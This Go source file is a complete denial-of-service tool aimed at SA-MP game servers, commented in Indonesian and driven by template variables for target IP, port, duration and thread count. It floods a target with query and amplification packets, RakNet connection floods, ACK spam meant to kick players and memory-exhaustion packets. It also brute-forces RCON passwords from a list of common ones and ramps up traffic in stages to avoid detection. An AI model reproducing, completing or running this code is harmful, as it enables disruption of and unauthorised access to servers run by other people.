package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ==================== TEMPLATE VARIABLES ====================
var (
	targetIP   = "{{.TargetIP}}"
	targetPort = "{{.TargetPort}}"
	duration   = "{{.Duration}}"
	threads    = "{{.Threads}}"
	method     = "{{.Method}}"
)

// ==================== KONSTANTA PROTOKOL ====================
const (
	SAMP_MAGIC      = "SAMP"
	SAMP_MIN_SIZE   = 11
	SAMP_MAX_SIZE   = 512
	
	// RakNet Packet IDs untuk exploitation [^48^][^100^]
	ID_ACKS           = 192 // Acknowledgment packets
	ID_PING_OPEN      = 4   // Open connection ping
	ID_PONG_OPEN      = 5   // Open connection pong
	ID_CONNECTION_REQ = 6   // Connection request
	ID_CONN_ACCEPTED  = 16  // Connection accepted
	
	MAX_THREADS       = 50000
	SOCKET_BUF_SIZE   = 32 * 1024 * 1024
)

// ==================== GLOBAL STATE ====================
var (
	totalPackets uint64 = 0
	totalBytes   uint64 = 0
	startTime    time.Time
	stopTime     time.Time
	
	targetAddr      *net.UDPAddr
	targetIPBytes   [4]byte
	targetPortInt   int
	targetPortBytes [2]byte
	
	cfg struct {
		threadCount  int
		durationSec  int
		attackMethod string
		enableRamp   bool
	}
	
	udpPool sync.Pool
	
	// Attack variants (150,000+ total)
	variants struct {
		queryFlood    [][]byte // Standard query (6 opcodes)
		queryExtended [][]byte // 39 opcodes
		queryAmp      [][]byte // Amplification queries (force large response)
		rconBrute     [][]byte // RCON attempts
		connFlood     [][]byte // Connection request flood
		ackSpam       [][]byte // Acknowledgment spam (trigger ackslimit) [^96^]
		memoryExhaust [][]byte // Memory exhaustion packets [^48^]
	}
)

type ConnPool struct {
	conn *net.UDPConn
	mu   sync.Mutex
}

// ==================== MAIN ====================
func main() {
	if err := initConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
		os.Exit(1)
	}
	
	if err := setupNetwork(); err != nil {
		fmt.Fprintf(os.Stderr, "Network error: %v\n", err)
		os.Exit(1)
	}
	
	fmt.Printf("[*] Generating 150,000+ attack variants...\n")
	generateVariants()
	
	initPools()
	printBanner()
	
	if cfg.enableRamp {
		executeRampUpAttack()
	} else {
		executeAttack()
	}
	
	waitAndReport()
}

func initConfig() error {
	var err error
	
	cfg.durationSec, err = strconv.Atoi(duration)
	if err != nil || cfg.durationSec <= 0 {
		cfg.durationSec = 60
	}
	
	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 1000
	}
	cfg.threadCount = baseThreads * runtime.NumCPU()
	if cfg.threadCount > MAX_THREADS {
		cfg.threadCount = MAX_THREADS
	}
	
	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
	if cfg.attackMethod == "" {
		cfg.attackMethod = "GOD"
	}
	
	cfg.enableRamp = true
	
	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
	startTime = time.Now()
	
	return nil
}

func setupNetwork() error {
	port, err := strconv.Atoi(targetPort)
	if err != nil {
		return err
	}
	targetPortInt = port
	
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
	if err != nil {
		return err
	}
	targetAddr = addr
	
	parts := strings.Split(targetIP, ".")
	if len(parts) != 4 {
		return fmt.Errorf("invalid IP")
	}
	for i, p := range parts {
		val, _ := strconv.Atoi(p)
		targetIPBytes[i] = byte(val)
	}
	
	targetPortBytes[0] = byte(port & 0xFF)
	targetPortBytes[1] = byte((port >> 8) & 0xFF)
	
	return nil
}

func initPools() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	udpPool = sync.Pool{
		New: func() interface{} {
			conn, err := net.DialUDP("udp", nil, targetAddr)
			if err != nil {
				return nil
			}
			
			if file, err := conn.File(); err == nil {
				fd := int(file.Fd())
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SOCKET_BUF_SIZE)
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 8*1024*1024)
				syscall.SetNonblock(fd, true)
				file.Close()
			}
			
			return &ConnPool{conn: conn}
		},
	}
}

// ==================== VARIANT GENERATION ====================
func generateVariants() {
	// 1. Query Standard (30,000) - 6 opcodes
	variants.queryFlood = make([][]byte, 30000)
	for i := 0; i < 30000; i++ {
		variants.queryFlood[i] = buildQueryPacket(i, false)
	}
	
	// 2. Query Extended (30,000) - 39 opcodes (0x69-0x8F)
	variants.queryExtended = make([][]byte, 30000)
	for i := 0; i < 30000; i++ {
		variants.queryExtended[i] = buildQueryPacket(i, true)
	}
	
	// 3. Query Amplification (20,000) - Force large server response [^92^]
	variants.queryAmp = make([][]byte, 20000)
	for i := 0; i < 20000; i++ {
		variants.queryAmp[i] = buildAmplificationQuery(i)
	}
	
	// 4. RCON Brute (20,000)
	variants.rconBrute = make([][]byte, 20000)
	for i := 0; i < 20000; i++ {
		variants.rconBrute[i] = buildRCONPacket(i)
	}
	
	// 5. Connection Flood (20,000) - Bypass minconnectiontime [^96^]
	variants.connFlood = make([][]byte, 20000)
	for i := 0; i < 20000; i++ {
		variants.connFlood[i] = buildConnectionFloodPacket(i)
	}
	
	// 6. Ack Spam (20,000) - Trigger ackslimit [^96^]
	variants.ackSpam = make([][]byte, 20000)
	for i := 0; i < 20000; i++ {
		variants.ackSpam[i] = buildAckSpamPacket(i)
	}
	
	// 7. Memory Exhaustion (10,000) - Based on RakNet exploit [^48^]
	variants.memoryExhaust = make([][]byte, 10000)
	for i := 0; i < 10000; i++ {
		variants.memoryExhaust[i] = buildMemoryExhaustPacket(i)
	}
	
	fmt.Printf("[+] Generated: %d query, %d extended, %d amp, %d rcon, %d conn, %d ack, %d mem\n",
		len(variants.queryFlood), len(variants.queryExtended), len(variants.queryAmp),
		len(variants.rconBrute), len(variants.connFlood), len(variants.ackSpam),
		len(variants.memoryExhaust))
}

// buildQueryPacket: Standard SAMP Query
func buildQueryPacket(variant int, extended bool) []byte {
	buf := new(bytes.Buffer)
	
	// Random prefix untuk bypass (10% chance)
	if variant%10 == 0 {
		prefix := []byte{0xFF, 0xFF, 0xFF, 0xFF}
		buf.Write(prefix)
	}
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	
	var opcode byte
	if extended {
		opcode = 0x69 + byte(variant%39) // 39 opcodes
	} else {
		opcodes := []byte{0x69, 0x72, 0x63, 0x64, 0x70, 0x78}
		opcode = opcodes[variant%6]
	}
	buf.WriteByte(opcode)
	
	// Size 16-512
	current := buf.Len()
	target := 16 + (variant % 497)
	if target > current && target <= SAMP_MAX_SIZE {
		padding := make([]byte, target-current)
		fillRandom(padding, variant)
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

// buildAmplificationQuery: Query yang force server kirim response besar [^92^]
func buildAmplificationQuery(variant int) []byte {
	buf := new(bytes.Buffer)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	
	// Players query (0x63 atau 0x64) - force server server kirim list player [^92^]
	// Server dengan >100 players akan timeout (heavy response)
	opcode := byte(0x63 + (variant % 2)) // 'c' atau 'd'
	buf.WriteByte(opcode)
	
	// Padding minimal untuk memicu processing
	padding := make([]byte, 4)
	binary.BigEndian.PutUint32(padding, uint32(variant))
	buf.Write(padding)
	
	return buf.Bytes()
}

// buildRCONPacket: RCON brute force
func buildRCONPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(0x78) // RCON
	
	passwords := []string{
		"rcon", "password", "1234", "admin", "samp", "owner", "server",
		"123456", "qwerty", "letmein", "gta", "sanandreas", "changeme",
		"root", "toor", "pass", "samp037", "samp03DL",
	}
	
	commands := []string{
		"echo", "hostname", "gamemodetext", "mapname", "players", "maxplayers",
		"weburl", "worldtime", "weather", "loadfs", "unloadfs", "reloadfs",
		"ban", "kick", "kill", "say", "broadcast", "changemode", "gmx",
		"exit", "query", "cmdlist", "varlist",
	}
	
	pass := passwords[variant%len(passwords)] + strconv.Itoa(variant%10000)
	cmd := commands[(variant/len(passwords))%len(commands)]
	
	binary.Write(buf, binary.LittleEndian, uint32(len(pass)))
	buf.WriteString(pass)
	binary.Write(buf, binary.LittleEndian, uint32(len(cmd)))
	buf.WriteString(cmd)
	
	if buf.Len() > SAMP_MAX_SIZE {
		return buf.Bytes()[:SAMP_MAX_SIZE]
	}
	return buf.Bytes()
}

// buildConnectionFloodPacket: Simulate connection requests [^96^]
// Bypass minconnectiontime=0, menyaturasi connection queue
func buildConnectionFloodPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// RakNet connection request simulation
	// Offline message ID
	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF})
	
	// Packet ID: ID_OPEN_CONNECTION_REQUEST_1 (5)
	buf.WriteByte(0x05)
	
	// RakNet Magic [^87^]
	rakMagic := []byte{0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE,
		0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78}
	buf.Write(rakMagic)
	
	// Protocol version
	buf.WriteByte(0x05)
	
	// MTU padding (bikin server allocate memory) [^48^]
	// Ukuran bervariasi untuk menghindari pattern detection
	mtuSize := 400 + (variant % 600) // 400-1000 bytes
	mtuPadding := make([]byte, mtuSize)
	rand.Read(mtuPadding)
	buf.Write(mtuPadding)
	
	return buf.Bytes()
}

// buildAckSpamPacket: Spam acknowledgments untuk trigger ackslimit [^96^]
// ackslimit default 3000 - jika exceeded, player di-kick
func buildAckSpamPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// RakNet ACK packet structure
	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF}) // Offline message
	buf.WriteByte(ID_ACKS)                     // ACK packet ID
	
	// Fake ACKs dengan sequence numbers acak
	// Bikin server process banyak ACKs sekaligus
	numAcks := 50 + (variant % 100) // 50-150 ACKs per packet
	
	for i := 0; i < numAcks; i++ {
		seq := uint24(variant*1000 + i)
		buf.Write(seq[:])
	}
	
	// Padding
	padding := make([]byte, 64)
	rand.Read(padding)
	buf.Write(padding)
	
	return buf.Bytes()
}

// buildMemoryExhaustPacket: Exploit memory exhaustion [^48^]
// Berdasarkan forum SAMP: exploit bikin VSZ 200MB → 800MB
func buildMemoryExhaustPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// Simulasi packet yang bikin server allocate buffer besar
	buf.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF})
	
	// Packet ID yang memicu allocation besar
	// ID_CONNECTION_REQUEST dengan payload palsu besar
	buf.WriteByte(ID_CONNECTION_REQ) // 0x06
	
	// Client GUID (8 bytes)
	guid := make([]byte, 8)
	binary.BigEndian.PutUint64(guid, uint64(variant))
	buf.Write(guid)
	
	// Timestamp
	binary.Write(buf, binary.LittleEndian, uint64(time.Now().UnixNano()))
	
	// Password (bikin server process)
	passLen := 50 + (variant % 200) // Variable length
	password := make([]byte, passLen)
	rand.Read(password)
	buf.Write(password)
	
	// MTU size yang tidak wajar (bikin server allocate)
	binary.Write(buf, binary.LittleEndian, uint16(1500+variant%1000))
	
	return buf.Bytes()
}

// Helper: uint24 untuk RakNet sequence numbers
func uint24(v int) [3]byte {
	return [3]byte{
		byte(v & 0xFF),
		byte((v >> 8) & 0xFF),
		byte((v >> 16) & 0xFF),
	}
}

func fillRandom(data []byte, seed int) {
	r := rand.New(rand.NewSource(int64(seed)))
	r.Read(data)
}

// ==================== ATTACK EXECUTION ====================
func executeRampUpAttack() {
	fmt.Printf("[RAMP-UP] Gradual escalation to avoid detection\n")
	
	stages := []struct {
		name    string
		percent int
		delay   time.Duration
	}{
		{"INIT", 5, 3 * time.Second},
		{"LOW", 15, 5 * time.Second},
		{"MED", 35, 5 * time.Second},
		{"HIGH", 60, 5 * time.Second},
		{"MAX", 100, 0},
	}
	
	activeThreads := 0
	
	for _, stage := range stages {
		targetThreads := cfg.threadCount * stage.percent / 100
		newThreads := targetThreads - activeThreads
		
		fmt.Printf("[STAGE: %s] Adding %d threads (total: %d)...\n", 
			stage.name, newThreads, targetThreads)
		
		launchThreads(newThreads, activeThreads)
		activeThreads = targetThreads
		
		if stage.delay > 0 {
			time.Sleep(stage.delay)
		}
	}
	
	// Wait sampai stop time
	time.Sleep(time.Until(stopTime))
}

func launchThreads(count, offset int) {
	var wg sync.WaitGroup
	
	// Distribusi attack vectors:
	// 25% Query, 20% Extended, 15% Amp, 15% RCON, 
	// 10% Conn Flood, 10% Ack Spam, 5% Memory Exhaust
	
	dist := []struct {
		name  string
		count int
		fn    func(int)
	}{
		{"Query", count * 25 / 100, func(id int) { worker(id, variants.queryFlood, 1, 20) }},
		{"Extended", count * 20 / 100, func(id int) { worker(id, variants.queryExtended, 1, 15) }},
		{"Amp", count * 15 / 100, func(id int) { worker(id, variants.queryAmp, 2, 25) }},
		{"RCON", count * 15 / 100, func(id int) { worker(id, variants.rconBrute, 1, 5) }},
		{"ConnFlood", count * 10 / 100, func(id int) { worker(id, variants.connFlood, 5, 50) }},
		{"AckSpam", count * 10 / 100, func(id int) { worker(id, variants.ackSpam, 10, 100) }},
		{"MemExhaust", count - (count*25/100)-(count*20/100)-(count*15/100)-(count*15/100)-(count*10/100)-(count*10/100), 
			func(id int) { worker(id, variants.memoryExhaust, 1, 3) }},
	}
	
	for _, d := range dist {
		for i := 0; i < d.count; i++ {
			wg.Add(1)
			go func(id int, fn func(int)) {
				defer wg.Done()
				fn(id + offset)
			}(i, d.fn)
		}
	}
	
	go func() {
		wg.Wait()
	}()
}

func executeAttack() {
	launchThreads(cfg.threadCount, 0)
	time.Sleep(time.Until(stopTime))
}

func worker(workerID int, pool [][]byte, burstMin, burstMax int) {
	conn := getConn()
	if conn == nil {
		return
	}
	defer putConn(conn)
	
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
	
	for time.Now().Before(stopTime) {
		idx := rng.Intn(len(pool))
		packet := pool[idx]
		
		// Burst dengan variasi
		burst := burstMin + rng.Intn(burstMax-burstMin+1)
		for b := 0; b < burst; b++ {
			sendPacket(conn, packet)
			if b < burst-1 && burst > 5 {
				spinWait(10 + rng.Intn(50))
			}
		}
		
		// Yield periodically untuk menghindari monopolization
		if workerID%50 == 0 {
			runtime.Gosched()
		}
	}
}

// ==================== UTILITIES ====================
func getConn() *ConnPool {
	c := udpPool.Get()
	if c == nil {
		return nil
	}
	return c.(*ConnPool)
}

func putConn(c *ConnPool) {
	if c != nil && c.conn != nil {
		udpPool.Put(c)
	}
}

func sendPacket(c *ConnPool, data []byte) {
	if c == nil || len(data) == 0 {
		return
	}
	
	c.mu.Lock()
	n, err := c.conn.Write(data)
	c.mu.Unlock()
	
	if err == nil && n > 0 {
		atomic.AddUint64(&totalPackets, 1)
		atomic.AddUint64(&totalBytes, uint64(n))
	}
}

func spinWait(ns int) {
	start := time.Now()
	for time.Since(start).Nanoseconds() < int64(ns) {
		runtime.Gosched()
	}
}

func printBanner() {
	fmt.Printf("\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║           SAMP V10 SUPREME - ADVANCED MULTI-VECTOR ARCHITECTURE              ║\n")
	fmt.Printf("║                                                                              ║\n")
	fmt.Printf("║  Attack Vectors:                                                             ║\n")
	fmt.Printf("║  ├─ Query Flood (6 opcodes)        ├─ Extended Query (39 opcodes)           ║\n")
	fmt.Printf("║  ├─ Amplification Queries          ├─ RCON Brute Force                       ║\n")
	fmt.Printf("║  ├─ Connection Flood               ├─ Ack Spam (Trigger ackslimit) [^96^]    ║\n")
	fmt.Printf("║  └─ Memory Exhaustion [^48^]       └─ Gradual Ramp-up                        ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Target: %-22s Port: %-8d Threads: %-10d              ║\n", targetIP, targetPortInt, cfg.threadCount)
	fmt.Printf("║ Duration: %-20ds Method: %-12s RampUp: %-8v              ║\n", cfg.durationSec, cfg.attackMethod, cfg.enableRamp)
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")
	fmt.Printf("[INFO] Memory Exhaustion: Simulating exploit yang bikin VSZ 200MB→800MB [^48^]\n")
	fmt.Printf("[INFO] Ack Spam: Trigger ackslimit (3000) untuk kick player [^96^]\n")
	fmt.Printf("[INFO] Conn Flood: Bypass minconnectiontime, saturasi queue [^96^]\n\n")
}

func waitAndReport() {
	ticker := time.NewTicker(5 * time.Second)
	done := make(chan bool)
	
	go func() {
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				pkts := atomic.LoadUint64(&totalPackets)
				bytes := atomic.LoadUint64(&totalBytes)
				
				pps := float64(pkts) / elapsed
				mbps := (float64(bytes) * 8.0) / (elapsed * 1024 * 1024)
				
				fmt.Printf("\r⏳ %.0fs | PPS: %.0f | MBPS: %.1f | Packets: %s", 
					elapsed, pps, mbps, formatNum(pkts))
			case <-done:
				return
			}
		}
	}()
	
	time.Sleep(time.Until(stopTime))
	done <- true
	ticker.Stop()
	
	printFinalStats()
}

func printFinalStats() {
	pkts := atomic.LoadUint64(&totalPackets)
	bytes := atomic.LoadUint64(&totalBytes)
	dur := uint64(cfg.durationSec)
	
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                           FINAL ATTACK STATISTICS                            ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  📦 TOTAL PACKETS:  %-20s                                   ║\n", formatNum(pkts))
	fmt.Printf("║  📊 TOTAL DATA:     %-10.2f MB (%-6.2f GB)                           ║\n", 
		float64(bytes)/(1024*1024), float64(bytes)/(1024*1024*1024))
	fmt.Printf("║  ⚡ AVERAGE PPS:    %-20s                                   ║\n", formatNum(pkts/dur))
	fmt.Printf("║  🌐 AVERAGE MBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024))
	fmt.Printf("║  💀 AVERAGE GBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
	fmt.Printf("║                                                                              ║\n")
	fmt.Printf("║  TARGET EFFECTS:                                                             ║\n")
	fmt.Printf("║  ├─ New Players:   BLOCKED (Query Thread Overload)                           ║\n")
	fmt.Printf("║  ├─ Memory Usage:  INCREASED (VSZ 200MB→800MB) [^48^]                        ║\n")
	fmt.Printf("║  ├─ Player Kicks:  RANDOM (AcksLimit Exceeded) [^96^]                        ║\n")
	fmt.Printf("║  ├─ Connections:  SATURATED (minconnectiontime bypass) [^96^]               ║\n")
	fmt.Printf("║  └─ Server CPU:   OVERLOADED (Multi-vector exhaustion)                       ║\n")
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}
